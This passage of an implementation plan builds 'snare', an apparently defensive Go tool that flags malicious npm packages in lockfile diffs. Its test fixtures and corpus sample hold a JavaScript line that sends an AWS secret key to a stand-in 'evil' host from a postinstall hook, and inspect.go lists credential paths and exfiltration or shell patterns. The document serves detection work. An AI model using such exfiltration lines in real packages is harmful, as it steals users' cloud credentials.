		ev = append(ev, model.Evidence{
			Signal:      "metadata.no_repository",
			Tier:        model.Low,
			Explanation: "package declares no source repository",
			Locator:     "registry",
		})
	}
	return ev
}

// isEstablished is the FP guardrail: old, widely-downloaded, has a repo.
func (s MetadataSignal) isEstablished(p model.PackageData) bool {
	old := s.ageDays(p) > 365
	popular := p.Registry.WeeklyDownloads > 10_000
	return old && popular && p.Registry.Repository != ""
}

// ageDays returns the package age in days, or -1 if unknown.
func (s MetadataSignal) ageDays(p model.PackageData) int {
	if p.Registry.FirstPublished == "" {
		return -1
	}
	t, err := time.Parse(time.RFC3339, p.Registry.FirstPublished)
	if err != nil {
		return -1
	}
	return int(s.now.Sub(t).Hours() / 24)
}
```

- [ ] **Step 4: Add gating to the engine**

Modify `internal/engine/engine.go` — replace the `Score` method body with a version that downgrades identity-path evidence on established packages:
```go
func (e *Engine) Score(p model.PackageData) model.Result {
	res := model.Result{Candidate: p.Candidate}
	for _, s := range e.signals {
		res.Evidence = append(res.Evidence, s.Evaluate(p)...)
	}
	gate(&res, p)
	return res
}

// gate applies the false-positive guardrail: if the package is clearly
// established, identity-path suspicion (name.*) is downgraded to LOW, because a
// years-old, widely-used package with a repo is not a fresh typosquat.
func gate(res *model.Result, p model.PackageData) {
	if !MetadataSignal{}.isEstablished(p) {
		// isEstablished needs a now; use refNow for the zero-value receiver.
		if !NewMetadataSignal(refNow).isEstablished(p) {
			return
		}
	}
	for i := range res.Evidence {
		ev := &res.Evidence[i]
		if len(ev.Signal) >= 5 && ev.Signal[:5] == "name." {
			ev.Tier = model.Low
			ev.Explanation += " (downgraded: package is well-established)"
		}
	}
}
```

> Simplify the receiver awkwardness: make `isEstablished` a package-level func `isEstablished(p model.PackageData, now time.Time) bool` and call `isEstablished(p, refNow)` from both `MetadataSignal.Evaluate` and `gate`. Update `metadata.go` accordingly. (The engineer should refactor to the free function; the test behavior is unchanged.)

- [ ] **Step 5: Run tests to verify they pass**

Run: `go test ./internal/engine/` → Expected: PASS (all engine tests).

- [ ] **Step 6: Commit**

```bash
git add internal/engine/
git commit -m "feat: metadata FP-killer signal + established-package gating"
```

---

## Task 9: Path 2 — lifecycle-hook detection

**Files:**
- Create: `internal/engine/hooks.go`
- Test: `internal/engine/hooks_test.go`

- [ ] **Step 1: Write the failing test**

`internal/engine/hooks_test.go`:
```go
package engine

import (
	"testing"

	"github.com/syedkarim/snare/internal/model"
)

func TestHookSignalFlagsInstallHooks(t *testing.T) {
	p := model.PackageData{Scripts: map[string]string{"postinstall": "node x.js"}}
	ev := HookSignal{}.Evaluate(p)
	if len(ev) == 0 || ev[0].Signal != "hook.lifecycle" {
		t.Fatalf("expected hook.lifecycle evidence, got %v", ev)
	}
}

func TestHookSignalSilentWithoutHooks(t *testing.T) {
	if ev := (HookSignal{}).Evaluate(model.PackageData{}); len(ev) != 0 {
		t.Errorf("no hooks should mean no evidence, got %v", ev)
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/engine/ -run TestHook` → Expected: FAIL (undefined `HookSignal`).

- [ ] **Step 3: Write minimal implementation**

`internal/engine/hooks.go`:
```go
package engine

import (
	"sort"

	"github.com/syedkarim/snare/internal/model"
)

// HookSignal flags the presence of install lifecycle hooks. Presence alone is
// only LOW (many legit packages build natively); inspect.go raises severity
// based on what the hook does.
type HookSignal struct{}

func (HookSignal) Name() string { return "hook" }

func (HookSignal) Evaluate(p model.PackageData) []model.Evidence {
	if len(p.Scripts) == 0 {
		return nil
	}
	var names []string
	for k := range p.Scripts {
		names = append(names, k)
	}
	sort.Strings(names)
	list := ""
	for i, n := range names {
		if i > 0 {
			list += ", "
		}
		list += n
	}
	return []model.Evidence{{
		Signal:      "hook.lifecycle",
		Tier:        model.Low,
		Explanation: "declares install lifecycle hook(s): " + list,
		Locator:     "package.json#scripts",
	}}
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `go test ./internal/engine/ -run TestHook` → Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/engine/hooks.go internal/engine/hooks_test.go
git commit -m "feat: lifecycle-hook presence signal"
```

---

## Task 10: Path 2 — install-script static inspection

The high-precision signal: scan the hook scripts AND the files they reference for credential-theft / exfiltration patterns. A hook that reads cloud creds and phones home is CRITICAL regardless of name/age.

**Files:**
- Create: `internal/engine/inspect.go`
- Test: `internal/engine/inspect_test.go`

- [ ] **Step 1: Write the failing test**

`internal/engine/inspect_test.go`:
```go
package engine

import (
	"testing"

	"github.com/syedkarim/snare/internal/model"
)

func TestInspectFlagsCredentialExfil(t *testing.T) {
	p := model.PackageData{
		Scripts: map[string]string{"postinstall": "node steal.js"},
		Files: map[string]string{
			"steal.js": "require('http').get('http://evil.tld/?k='+process.env.AWS_SECRET_ACCESS_KEY)",
		},
	}
	ev := InspectSignal{}.Evaluate(p)
	var top model.Tier
	for _, e := range ev {
		if e.Tier > top {
			top = e.Tier
		}
	}
	if top < model.High {
		t.Fatalf("credential exfil should be HIGH+, got tier %v from %v", top, ev)
	}
}

func TestInspectQuietOnBenignBuild(t *testing.T) {
	p := model.PackageData{
		Scripts: map[string]string{"install": "node-gyp rebuild"},
		Files:   map[string]string{"binding.gyp": "{ 'targets': [] }"},
	}
	if ev := (InspectSignal{}).Evaluate(p); len(ev) != 0 {
		t.Errorf("benign native build should not be flagged, got %v", ev)
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/engine/ -run TestInspect` → Expected: FAIL (undefined `InspectSignal`).

- [ ] **Step 3: Write minimal implementation**

`internal/engine/inspect.go`:
```go
package engine

import (
	"strings"

	"github.com/syedkarim/snare/internal/model"
)

// InspectSignal statically scans hook scripts and the files they reference for
// high-signal malicious patterns.
type InspectSignal struct{}

func (InspectSignal) Name() string { return "inspect" }

type pattern struct {
	needle string
	label  string
}

// credentialReads are accesses to secret material.
var credentialReads = []pattern{
	{"AWS_SECRET_ACCESS_KEY", "reads AWS secret key"},
	{"AWS_SESSION_TOKEN", "reads AWS session token"},
	{".aws/credentials", "reads AWS credentials file"},
	{".npmrc", "reads npm credentials"},
	{"VAULT_TOKEN", "reads Vault token"},
	{"id_rsa", "reads SSH private key"},
	{".ssh/", "reads SSH directory"},
	{"GITHUB_TOKEN", "reads GitHub token"},
}

// exfilOrExec are egress / remote-exec indicators.
var exfilOrExec = []pattern{
	{"curl ", "shells out to curl"},
	{"| sh", "pipes downloaded content to a shell"},
	{"|sh", "pipes downloaded content to a shell"},
	{"child_process", "spawns a child process"},
	{"http.get", "makes an outbound HTTP request"},
	{"https.get", "makes an outbound HTTPS request"},
	{"fetch(", "makes an outbound fetch request"},
	{"Buffer.from(", "decodes an embedded blob"},
	{"eval(", "evaluates dynamic code"},
}

// hookReferenced returns the file bodies a hook script invokes, plus the hook
// bodies themselves. Minimal v1: include every hook body and any referenced
// .js file present in Files.
func hookReferenced(p model.PackageData) []string {
	var bodies []string
	for _, body := range p.Scripts {
		bodies = append(bodies, body)
		for _, tok := range strings.Fields(body) {
			tok = strings.Trim(tok, "'\"")
			if strings.HasSuffix(tok, ".js") {
				if f, ok := p.Files[tok]; ok {
					bodies = append(bodies, f)
				}
			}
		}
	}
	return bodies
}

func (InspectSignal) Evaluate(p model.PackageData) []model.Evidence {
	if len(p.Scripts) == 0 {
		return nil
	}
	corpus := strings.Join(hookReferenced(p), "\n")
	readsCred, reason := firstMatch(corpus, credentialReads)
	egress, egressReason := firstMatch(corpus, exfilOrExec)

	var ev []model.Evidence
	switch {
	case readsCred && egress:
		ev = append(ev, model.Evidence{
			Signal:      "inspect.exfil",
			Tier:        model.Critical,
			Explanation: "install hook " + reason + " and " + egressReason,
			Locator:     "install script",
		})
	case readsCred:
		ev = append(ev, model.Evidence{
			Signal:      "inspect.credread",
			Tier:        model.High,
			Explanation: "install hook " + reason,
			Locator:     "install script",
		})
	case egress:
		ev = append(ev, model.Evidence{
			Signal:      "inspect.egress",
			Tier:        model.Medium,
			Explanation: "install hook " + egressReason,
			Locator:     "install script",
		})
	}
	return ev
}

func firstMatch(corpus string, pats []pattern) (bool, string) {
	for _, p := range pats {
		if strings.Contains(corpus, p.needle) {
			return true, p.label
		}
	}
	return false, ""
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `go test ./internal/engine/` → Expected: PASS (all engine tests).

- [ ] **Step 5: Commit**

```bash
git add internal/engine/inspect.go internal/engine/inspect_test.go
git commit -m "feat: install-script static inspection (credential-read + exfil patterns)"
```

---

## Task 11: Reporter (human/JSON/SARIF + exit code)

**Files:**
- Create: `internal/report/report.go`
- Test: `internal/report/report_test.go`

- [ ] **Step 1: Write the failing test**

`internal/report/report_test.go`:
```go
package report

import (
	"strings"
	"testing"

	"github.com/syedkarim/snare/internal/model"
)

func sampleResults() []model.Result {
	return []model.Result{{
		Candidate: model.Candidate{Name: "reqeusts", Version: "0.0.1"},
		Evidence: []model.Evidence{{
			Signal: "name.typosquat", Tier: model.High,
			Explanation: "name is 2 edit(s) from popular package \"requests\"", Locator: "name",
		}},
	}}
}

func TestExitCodeAtThreshold(t *testing.T) {
	if code := ExitCode(sampleResults(), model.High); code != 1 {
		t.Errorf("exit code = %d, want 1", code)
	}
	if code := ExitCode(sampleResults(), model.Critical); code != 0 {
		t.Errorf("below threshold should exit 0, got %d", code)
	}
}

func TestHumanReportMentionsPackageAndReason(t *testing.T) {
	out := Human(sampleResults())
	if !strings.Contains(out, "reqeusts@0.0.1") || !strings.Contains(out, "HIGH") {
		t.Errorf("human report missing package or tier:\n%s", out)
	}
}

func TestJSONReportIsValid(t *testing.T) {
	out := JSON(sampleResults())
	if !strings.Contains(out, `"name.typosquat"`) {
		t.Errorf("json missing signal:\n%s", out)
	}
}

func TestSARIFHasRuleAndResult(t *testing.T) {
	out := SARIF(sampleResults())
	if !strings.Contains(out, `"ruleId"`) || !strings.Contains(out, "name.typosquat") {
		t.Errorf("sarif missing ruleId/result:\n%s", out)
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/report/` → Expected: FAIL (undefined funcs).

- [ ] **Step 3: Write minimal implementation**

`internal/report/report.go`:
```go
// Package report renders scored results to human/JSON/SARIF and computes the
// process exit code.
package report

import (
	"encoding/json"
	"fmt"
	"strings"

	"github.com/syedkarim/snare/internal/model"
)

// ExitCode returns 1 if any result meets or exceeds failOn, else 0.
func ExitCode(results []model.Result, failOn model.Tier) int {
	for _, r := range results {
		if r.TopTier().AtLeast(failOn) {
			return 1
		}
	}
	return 0
}

func Human(results []model.Result) string {
	var b strings.Builder
	flagged := 0
	for _, r := range results {
		if r.TopTier() == model.Clear {
			continue
		}
		flagged++
		fmt.Fprintf(&b, "[%s] %s@%s\n", r.TopTier(), r.Candidate.Name, r.Candidate.Version)
		for _, e := range r.Evidence {
			fmt.Fprintf(&b, "    - %s: %s\n", e.Signal, e.Explanation)
		}
	}
	if flagged == 0 {
		return "snare: no risky packages found in diff\n"
	}
	fmt.Fprintf(&b, "\nsnare: %d package(s) flagged\n", flagged)
	return b.String()
}

func JSON(results []model.Result) string {
	type jsonEvidence struct {
		Signal, Explanation, Locator, Tier string
	}
	type jsonResult struct {
		Name, Version, Tier string
		Evidence            []jsonEvidence
	}
	var out []jsonResult
	for _, r := range results {
		jr := jsonResult{Name: r.Candidate.Name, Version: r.Candidate.Version, Tier: r.TopTier().String()}
		for _, e := range r.Evidence {
			jr.Evidence = append(jr.Evidence, jsonEvidence{e.Signal, e.Explanation, e.Locator, e.Tier.String()})
		}
		out = append(out, jr)
	}
	buf, _ := json.MarshalIndent(out, "", "  ")
	return string(buf)
}

// SARIF emits a minimal SARIF 2.1.0 log so GitHub code-scanning renders findings.
func SARIF(results []model.Result) string {
	type loc struct {
		Message struct {
			Text string `json:"text"`
		} `json:"message"`
	}
	type sarifResult struct {
		RuleID  string `json:"ruleId"`
		Level   string `json:"level"`
		Message struct {
			Text string `json:"text"`
		} `json:"message"`
	}
	var rs []sarifResult
	for _, r := range results {
		for _, e := range r.Evidence {
			var sr sarifResult
			sr.RuleID = e.Signal
			sr.Level = sarifLevel(e.Tier)
			sr.Message.Text = fmt.Sprintf("%s@%s: %s", r.Candidate.Name, r.Candidate.Version, e.Explanation)
			rs = append(rs, sr)
		}
	}
	doc := map[string]any{
		"version": "2.1.0",
		"$schema": "https://json.schemastore.org/sarif-2.1.0.json",
		"runs": []map[string]any{{
			"tool":    map[string]any{"driver": map[string]any{"name": "snare", "rules": []any{}}},
			"results": rs,
		}},
	}
	buf, _ := json.MarshalIndent(doc, "", "  ")
	return string(buf)
}

func sarifLevel(t model.Tier) string {
	switch t {
	case model.Critical, model.High:
		return "error"
	case model.Medium:
		return "warning"
	default:
		return "note"
	}
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `go test ./internal/report/` → Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/report/
git commit -m "feat: human/JSON/SARIF reporters + threshold exit code"
```

---

## Task 12: Config + allowlist (.snareignore)

**Files:**
- Create: `internal/config/config.go`
- Test: `internal/config/config_test.go`

- [ ] **Step 1: Write the failing test**

`internal/config/config_test.go`:
```go
package config

import "testing"

func TestAllowlistMatches(t *testing.T) {
	al, err := ParseAllowlist([]byte("# comment\nleft-pad@1.3.0 known-good\nfoo@*  internal\n"))
	if err != nil {
		t.Fatal(err)
	}
	if !al.Allowed("left-pad", "1.3.0") {
		t.Error("left-pad@1.3.0 should be allowed")
	}
	if al.Allowed("left-pad", "1.4.0") {
		t.Error("left-pad@1.4.0 should NOT be allowed (version-specific)")
	}
	if !al.Allowed("foo", "9.9.9") {
		t.Error("foo@* should allow any version")
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/config/` → Expected: FAIL (undefined `ParseAllowlist`).

- [ ] **Step 3: Write minimal implementation**

`internal/config/config.go`:
```go
// Package config parses snare policy and the .snareignore allowlist.
package config

import (
	"bufio"
	"bytes"
	"fmt"
	"strings"
)

// Allowlist maps "name@version" (or "name@*") to a required reason.
type Allowlist struct {
	exact map[string]string // name@version -> reason
	any   map[string]string // name -> reason (wildcard)
}

func ParseAllowlist(data []byte) (*Allowlist, error) {
	al := &Allowlist{exact: map[string]string{}, any: map[string]string{}}
	sc := bufio.NewScanner(bytes.NewReader(data))
	for ln := 1; sc.Scan(); ln++ {
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		fields := strings.Fields(line)
		spec := fields[0]
		reason := strings.Join(fields[1:], " ")
		if reason == "" {
			return nil, fmt.Errorf("line %d: allowlist entry %q needs a reason", ln, spec)
		}
		at := strings.LastIndex(spec, "@")
		if at <= 0 {
			return nil, fmt.Errorf("line %d: bad entry %q, want name@version", ln, spec)
		}
		name, ver := spec[:at], spec[at+1:]
		if ver == "*" {
			al.any[name] = reason
		} else {
			al.exact[spec] = reason
		}
	}
	return al, sc.Err()
}

func (a *Allowlist) Allowed(name, version string) bool {
	if _, ok := a.any[name]; ok {
		return true
	}
	_, ok := a.exact[name+"@"+version]
	return ok
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `go test ./internal/config/` → Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/config/
git commit -m "feat: .snareignore allowlist with required reasons"
```

---

## Task 13: Wire the CLI end-to-end + e2e test

Assemble `snare audit --base <lock> --head <lock>` using the real registry, applying the allowlist, and exiting on threshold. Add a `popular.go` loader for the bundled snapshot.

**Files:**
- Create: `internal/engine/popular.go`
- Modify: `cmd/snare/main.go`
- Test: `cmd/snare/audit_test.go`

- [ ] **Step 1: Write the popular-snapshot loader**

`internal/engine/popular.go`:
```go
package engine

import (
	_ "embed"
	"strings"
)

//go:embed testdata/popular.txt
var popularRaw string

// PopularSet returns the bundled popular-package name set.
func PopularSet() map[string]bool {
	set := map[string]bool{}
	for _, line := range strings.Split(popularRaw, "\n") {
		if name := strings.TrimSpace(line); name != "" && !strings.HasPrefix(name, "#") {
			set[name] = true
		}
	}
	return set
}

// Default returns the standard v1 signal stack.
func Default(now timeNow) []Signal {
	return []Signal{
		NewNameSignal(PopularSet()),
		NewMetadataSignal(now),
		HookSignal{},
		InspectSignal{},
	}
}
```

> The engineer must reconcile the `now` type: `Default` takes `time.Time`; change the param to `time.Time` and import `time`. (`timeNow` is shorthand here — use `time.Time`.)

- [ ] **Step 2: Write the failing e2e test**

`cmd/snare/audit_test.go`:
```go
package main

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"
)

// A registry serving one malicious typosquat package.
func maliciousRegistry(t *testing.T) *httptest.Server {
	t.Helper()
	var tb bytes.Buffer
	gz := gzip.NewWriter(&tb)
	tw := tar.NewWriter(gz)
	pkgJSON := `{"name":"reqeusts","version":"0.0.1","scripts":{"postinstall":"node s.js"}}`
	for name, body := range map[string]string{
		"package/package.json": pkgJSON,
		"package/s.js":         "require('https').get('https://evil/'+process.env.AWS_SECRET_ACCESS_KEY)",
	} {
		tw.WriteHeader(&tar.Header{Name: name, Mode: 0o644, Size: int64(len(body))})
		tw.Write([]byte(body))
	}
	tw.Close()
	gz.Close()
	tarball := tb.Bytes()

	mux := http.NewServeMux()
	mux.HandleFunc("/reqeusts", func(w http.ResponseWriter, r *http.Request) {
		m := map[string]any{
			"name":      "reqeusts",
			"dist-tags": map[string]string{"latest": "0.0.1"},
			"time":      map[string]string{"created": "2026-06-06T00:00:00Z", "0.0.1": "2026-06-06T00:00:00Z"},
			"maintainers": []map[string]string{{"name": "x"}},
			"versions": map[string]any{"0.0.1": map[string]any{
				"name": "reqeusts", "version": "0.0.1",
				"dist": map[string]string{"tarball": "http://" + r.Host + "/t/reqeusts.tgz"},
			}},
		}
		json.NewEncoder(w).Encode(m)
	})
	mux.HandleFunc("/t/reqeusts.tgz", func(w http.ResponseWriter, r *http.Request) { w.Write(tarball) })
	return httptest.NewServer(mux)
}

func TestAuditFlagsMaliciousPackage(t *testing.T) {
	srv := maliciousRegistry(t)
	defer srv.Close()

	dir := t.TempDir()
	base := filepath.Join(dir, "base.json")
	head := filepath.Join(dir, "head.json")
	os.WriteFile(base, []byte(`{"lockfileVersion":3,"packages":{"":{"name":"app"}}}`), 0o644)
	os.WriteFile(head, []byte(`{"lockfileVersion":3,"packages":{"":{"name":"app"},"node_modules/reqeusts":{"version":"0.0.1"}}}`), 0o644)

	code := runAudit(auditOpts{
		base: base, head: head, registry: srv.URL, failOn: "high", format: "human",
		out: os.Stderr,
	})
	if code != 1 {
		t.Fatalf("expected exit code 1 for malicious package, got %d", code)
	}
}
```

- [ ] **Step 3: Run test to verify it fails**

Run: `go test ./cmd/snare/ -run TestAudit` → Expected: FAIL (undefined `runAudit`/`auditOpts`).

- [ ] **Step 4: Implement the audit wiring**

Replace `cmd/snare/main.go` with:
```go
package main

import (
	"flag"
	"fmt"
	"io"
	"os"
	"time"

	"github.com/syedkarim/snare/internal/config"
	"github.com/syedkarim/snare/internal/engine"
	"github.com/syedkarim/snare/internal/fetcher"
	"github.com/syedkarim/snare/internal/model"
	"github.com/syedkarim/snare/internal/registry"
	"github.com/syedkarim/snare/internal/report"
	"github.com/syedkarim/snare/internal/resolver"
)

var version = "0.0.0-dev"

type auditOpts struct {
	base, head string
	registry   string
	failOn     string
	format     string
	allowlist  string
	out        io.Writer
}

func tierFromString(s string) model.Tier {
	switch s {
	case "critical":
		return model.Critical
	case "high":
		return model.High
	case "medium":
		return model.Medium
	case "low":
		return model.Low
	default:
		return model.High
	}
}

func runAudit(o auditOpts) int {
	baseData, err := os.ReadFile(o.base)
	if err != nil {
		fmt.Fprintln(o.out, "snare: read base lockfile:", err)
		return 2
	}
	headData, err := os.ReadFile(o.head)
	if err != nil {
		fmt.Fprintln(o.out, "snare: read head lockfile:", err)
		return 2
	}
	candidates, err := resolver.Diff(baseData, headData)
	if err != nil {
		fmt.Fprintln(o.out, "snare:", err)
		return 2
	}

	var allow *config.Allowlist
	if o.allowlist != "" {
		if data, err := os.ReadFile(o.allowlist); err == nil {
			allow, _ = config.ParseAllowlist(data)
		}
	}

	reg := &registry.HTTPClient{BaseURL: o.registry}
	f := fetcher.New(reg)
	eng := engine.New(engine.Default(time.Now()))

	var results []model.Result
	for _, c := range candidates {
		if allow != nil && allow.Allowed(c.Name, c.Version) {
			continue
		}
		data, err := f.Fetch(c)
		if err != nil {
			results = append(results, model.Result{Candidate: c, Errored: true, ErrMsg: err.Error()})
			continue
		}
		results = append(results, eng.Score(data))
	}

	switch o.format {
	case "json":
		fmt.Fprintln(o.out, report.JSON(results))
	case "sarif":
		fmt.Fprintln(o.out, report.SARIF(results))
	default:
		fmt.Fprint(o.out, report.Human(results))
	}
	return report.ExitCode(results, tierFromString(o.failOn))
}

func main() {
	fs := flag.NewFlagSet("snare", flag.ExitOnError)
	showVersion := fs.Bool("version", false, "print version and exit")

	if len(os.Args) >= 2 && os.Args[1] == "audit" {
		var o auditOpts
		o.out = os.Stdout
		af := flag.NewFlagSet("audit", flag.ExitOnError)
		af.StringVar(&o.base, "base", "", "base package-lock.json (PR target)")
		af.StringVar(&o.head, "head", "", "head package-lock.json (PR branch)")
		af.StringVar(&o.registry, "registry", "https://registry.npmjs.org", "npm registry base URL")
		af.StringVar(&o.failOn, "fail-on", "high", "min tier to fail: low|medium|high|critical")
		af.StringVar(&o.format, "format", "human", "output format: human|json|sarif")
		af.StringVar(&o.allowlist, "allowlist", ".snareignore", "allowlist file")
		_ = af.Parse(os.Args[2:])
		if o.base == "" || o.head == "" {
			fmt.Fprintln(os.Stderr, "snare audit: --base and --head are required")
			os.Exit(2)
		}
		os.Exit(runAudit(o))
	}

	_ = fs.Parse(os.Args[1:])
	if *showVersion {
		fmt.Println("snare", version)
		return
	}
	fmt.Fprintln(os.Stderr, "usage: snare audit --base <lock> --head <lock> [flags]")
	os.Exit(2)
}
```

- [ ] **Step 5: Run the e2e test to verify it passes**

Run: `go test ./cmd/snare/` → Expected: PASS.

- [ ] **Step 6: Run the whole suite + build**

Run: `go test ./... && go build -o snare ./cmd/snare && ./snare --version`
Expected: all packages PASS; binary prints `snare 0.0.0-dev`.

- [ ] **Step 7: Commit**

```bash
git add cmd/snare/ internal/engine/popular.go
git commit -m "feat: wire snare audit end-to-end (resolve -> fetch -> score -> report)"
```

---

## Task 14: False-positive regression corpus harness

The quality bar from the spec: legit packages must score CLEAR/LOW; known-malicious samples must score HIGH+. This is a data-driven test that fails CI if detection regresses.

**Files:**
- Create: `internal/engine/corpus_test.go`
- Create: `testdata/corpus/good/README.md` (instructions + a couple seed fixtures)
- Create: `testdata/corpus/malicious/README.md`

- [ ] **Step 1: Write the corpus test**

`internal/engine/corpus_test.go`:
```go
package engine_test

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/syedkarim/snare/internal/engine"
	"github.com/syedkarim/snare/internal/model"
)

// corpusCase is a stored PackageData fixture + its expected max tier bound.
type corpusCase struct {
	Data    model.PackageData `json:"data"`
	MaxTier string            `json:"max_tier,omitempty"` // for good/: must NOT exceed this
	MinTier string            `json:"min_tier,omitempty"` // for malicious/: must reach this
}

func loadCases(t *testing.T, dir string) map[string]corpusCase {
	t.Helper()
	cases := map[string]corpusCase{}
	entries, err := os.ReadDir(dir)
	if os.IsNotExist(err) {
		return cases
	}
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		if filepath.Ext(e.Name()) != ".json" {
			continue
		}
		buf, err := os.ReadFile(filepath.Join(dir, e.Name()))
		if err != nil {
			t.Fatal(err)
		}
		var c corpusCase
		if err := json.Unmarshal(buf, &c); err != nil {
			t.Fatalf("%s: %v", e.Name(), err)
		}
		cases[e.Name()] = c
	}
	return cases
}

func tierVal(s string) model.Tier {
	switch s {
	case "CRITICAL":
		return model.Critical
	case "HIGH":
		return model.High
	case "MEDIUM":
		return model.Medium
	case "LOW":
		return model.Low
	default:
		return model.Clear
	}
}

func TestCorpusGoodStaysQuiet(t *testing.T) {
	eng := engine.New(engine.Default(time.Now()))
	for name, c := range loadCases(t, "../../testdata/corpus/good") {
		bound := tierVal(c.MaxTier)
		if got := eng.Score(c.Data).TopTier(); got > bound {
			t.Errorf("%s: scored %v, exceeds allowed max %v (FALSE POSITIVE)", name, got, bound)
		}
	}
}

func TestCorpusMaliciousIsCaught(t *testing.T) {
	eng := engine.New(engine.Default(time.Now()))
	for name, c := range loadCases(t, "../../testdata/corpus/malicious") {
		floor := tierVal(c.MinTier)
		if got := eng.Score(c.Data).TopTier(); got < floor {
			t.Errorf("%s: scored %v, below required min %v (FALSE NEGATIVE)", name, got, floor)
		}
	}
}
```

- [ ] **Step 2: Add seed fixtures**

`testdata/corpus/good/node-gyp-build.json` (a legit native build that must stay quiet):
```json
{
  "data": {
    "Candidate": {"Name": "bcrypt", "Version": "5.1.1"},
    "Registry": {"FirstPublished": "2013-01-01T00:00:00Z", "VersionPublished": "2023-08-01T00:00:00Z", "WeeklyDownloads": 1500000, "Maintainers": 3, "Repository": "git+https://github.com/kelektiv/node.bcrypt.js.git", "LatestVersion": "5.1.1"},
    "Scripts": {"install": "node-gyp-build"},
    "Files": {"binding.gyp": "{ 'targets': [ { 'target_name': 'bcrypt_lib' } ] }"}
  },
  "max_tier": "LOW"
}
```

`testdata/corpus/malicious/reqeusts-exfil.json` (a sanitized typosquat-with-exfil that must be caught):
```json
{
  "data": {
    "Candidate": {"Name": "reqeusts", "Version": "0.0.1"},
    "Registry": {"FirstPublished": "2026-06-06T00:00:00Z", "VersionPublished": "2026-06-06T00:00:00Z", "WeeklyDownloads": 4, "Maintainers": 1, "Repository": "", "LatestVersion": "0.0.1"},
    "Scripts": {"postinstall": "node s.js"},
    "Files": {"s.js": "require('https').get('https://evil.tld/?k='+process.env.AWS_SECRET_ACCESS_KEY)"}
  },
  "min_tier": "HIGH"
}
```

`testdata/corpus/good/README.md` and `testdata/corpus/malicious/README.md`: one paragraph each explaining the JSON shape, that `good/` fixtures assert a `max_tier` ceiling (FP guard) and `malicious/` fixtures assert a `min_tier` floor (FN guard), and how to add new sanitized samples safely (strip real endpoints, never include working payloads).

- [ ] **Step 3: Run the corpus tests**

Run: `go test ./internal/engine/ -run TestCorpus -v`
Expected: PASS — good fixture ≤ LOW, malicious fixture ≥ HIGH.

- [ ] **Step 4: Run the whole suite**

Run: `go test ./...` → Expected: all PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/engine/corpus_test.go testdata/corpus/
git commit -m "test: false-positive/negative regression corpus harness + seed fixtures"
```

---

## Task 15: README + GitHub Action wrapper

**Files:**
- Create: `README.md`
- Create: `action.yml`
- Create: `.github/workflows/ci.yml`

- [ ] **Step 1: Write the README**

`README.md` covering: the problem (install-time npm malice CVE scanners miss), what snare does (audits the lockfile diff in a PR), quick start (`go install` + the three `snare audit` flags), example output, the two-path detection model, the allowlist, and explicit non-goals (not a CVE scanner; npm-only v1). Keep it tight and example-led.

- [ ] **Step 2: Write the GitHub Action**

`action.yml` — a composite action that checks out base & head lockfiles and runs `snare audit --base ... --head ... --format sarif`, uploading SARIF to code-scanning. Document required inputs (`fail-on`, default `high`).

- [ ] **Step 3: Write CI**

`.github/workflows/ci.yml` — on push/PR: `go test ./...`, `go vet ./...`, `go build ./...`. This is what makes the FP corpus a real gate.

- [ ] **Step 4: Verify CI config locally**

Run: `go vet ./... && go test ./... && go build ./cmd/snare`
Expected: clean.

- [ ] **Step 5: Commit**

```bash
git add README.md action.yml .github/
git commit -m "docs: README + GitHub Action wrapper + CI"
```

---

## Self-Review (completed by plan author)

**1. Spec coverage** — every spec section maps to a task:
- §3 four units → Tasks 3 (resolver), 5 (fetcher), 6–10 (engine), 11 (reporter). ✔
- §4 two-path engine + gating + light maintainer anomaly → Tasks 7 (name), 8 (metadata+gate), 9 (hooks), 10 (inspect). *Maintainer burst-publish anomaly is specced but only partially covered (Maintainers count exists; burst-publish detection is not yet a task)* → **carry into execution as a follow-up task or v1.1; flagged in Open Questions.**
- §5 tiers + `--fail-on` + allowlist + "why" → Tasks 11, 12. ✔
- §6 human/JSON/SARIF + Action → Tasks 11, 15. ✔
- §7 error handling (fail-open, malformed lockfile, size caps) → Task 4 (caps), 3 (parse errors), 13 (fetch error → Errored result). *Fail-open on registry flakiness is represented as per-candidate Errored results, not a global fail-open switch* → acceptable for v1; note for refinement.
- §8 testing incl. FP corpus → Task 14. ✔

**2. Placeholder scan** — no "TBD/TODO" in code steps. Two deliberate engineer-refactor notes (fetcher test JSON-fixture; `isEstablished` free function; `Default` `time.Time` param) are called out explicitly with the exact change required, not left vague.

**3. Type consistency** — `model.Tier`, `Candidate`, `PackageData`, `Evidence`, `Result` used consistently across resolver/fetcher/engine/report. `Signal` interface (`Name()`, `Evaluate()`) consistent in Tasks 6–10 and `engine.Default`. `engine.Default` takes `time.Time` (reconciled in Task 13 note). Registry `Client` interface consistent between Tasks 4–5 and 13.

**Known follow-ups for execution (not blockers):** burst-publish maintainer anomaly signal; weekly-downloads endpoint wiring (currently `-1`); global fail-open flag; expand `popular.txt` snapshot from a real top-N npm list.
